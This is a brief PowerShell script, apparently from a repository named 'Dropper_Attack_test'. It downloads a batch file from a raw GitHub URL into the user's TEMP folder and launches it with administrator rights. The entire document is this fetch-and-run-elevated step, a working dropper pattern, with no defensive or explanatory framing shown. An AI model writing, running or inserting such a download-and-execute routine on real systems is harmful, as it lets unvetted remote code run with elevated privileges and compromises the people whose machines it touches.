$url = "https://raw.githubusercontent.com/neck392/Dropper_Attack_test/main/Dropper"
$output = "$env:TEMP\dropper.bat"

Invoke-WebRequest -Uri $url -OutFile $output

Start-Process -FilePath $output -Verb RunAs
